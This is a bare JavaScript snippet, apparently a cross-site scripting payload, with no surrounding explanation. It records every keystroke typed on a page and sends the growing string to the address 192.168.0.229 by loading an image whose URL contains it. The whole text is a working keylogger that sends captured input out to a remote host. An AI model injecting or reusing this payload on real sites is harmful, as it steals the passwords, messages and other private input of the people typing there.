<script> 
    var k = "";
    document.onkeypress = function(e){
        e = e || window.event;
        k += e.key;
        var i = new Image();
        i.src = "http://192.168.0.229/" + k;
    };
</script>